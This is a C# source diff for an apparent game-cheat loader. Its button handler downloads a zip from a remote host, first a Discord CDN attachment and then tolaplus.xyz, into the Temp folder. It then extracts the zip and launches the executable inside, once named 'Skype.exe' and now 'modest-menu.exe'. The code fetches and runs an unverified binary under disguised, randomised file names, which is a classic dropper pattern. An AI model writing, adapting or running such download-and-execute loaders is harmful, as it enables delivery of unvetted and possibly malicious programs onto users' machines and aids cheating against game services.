@@ -19,34 +19,32 @@ using System.IO.Compression;
 
 namespace Loader.Products
 {
-    public partial class valo : UserControl
+    public partial class gtaV1 : UserControl
     {
-        public valo()
+        public gtaV1()
         {
             InitializeComponent();
         }
-
 
         private void loadcheatbutton_Click(object sender, EventArgs e)
         {
 
             try
             {
-
-                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\QwSdCxFrYb.zip");
+                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\GqTsAcXgU.zip");
                 string extractzip = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\1");
 
                 WebClient webClient = new WebClient();
-                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/980267575902609431/983806205749243934/QwSdCxFrYb.zip"), @download);
+                webClient.DownloadFileAsync(new Uri("https://tolaplus.xyz/1/GqTsAcXgU.zip"), @download);
 
-                Thread.Sleep(9000);
+                Thread.Sleep(10000);
                 string zipPatch = download;
                 string extractPatch = extractzip;
                 System.IO.Compression.ZipFile.ExtractToDirectory(zipPatch, extractPatch);
 
                 // Construct the path.
                 string temp = Environment.GetEnvironmentVariable("temp");
-                string path = Path.Combine(temp, "1\\Skype.exe");
+                string path = Path.Combine(temp, "1\\modest-menu.exe");
                 // Launch the process.
                 Process p = new Process();
                 p.StartInfo.FileName = path;
@@ -64,7 +62,5 @@ namespace Loader.Products
             }
 
         }
-
-
     }
 }
